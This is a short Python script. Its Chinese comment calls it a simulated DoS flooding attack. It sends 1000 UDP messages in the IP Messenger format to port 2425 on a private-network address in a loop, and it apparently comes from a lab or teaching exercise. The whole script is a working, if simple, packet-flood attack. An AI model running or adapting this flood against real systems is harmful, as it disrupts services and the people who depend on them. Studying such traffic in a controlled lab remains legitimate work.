import socket, time

# 模拟高频发送数据包的DOS攻击行为（流量泛洪）

for i in range(1000):
    s = socket.socket(type=socket.SOCK_DGRAM)   # 以UDP协议进行通信
    s.connect(('192.168.112.130', 2425))

    packetId = str(time.time())
    name = "Qiang"
    host = "MyHostName"
    command = str(0x00000020)
    content = "This is the message from Python."
    message = "1.0:" + packetId + ":" + name + ":" + host + ":" + command + ":" + content

    s.send(message.encode())

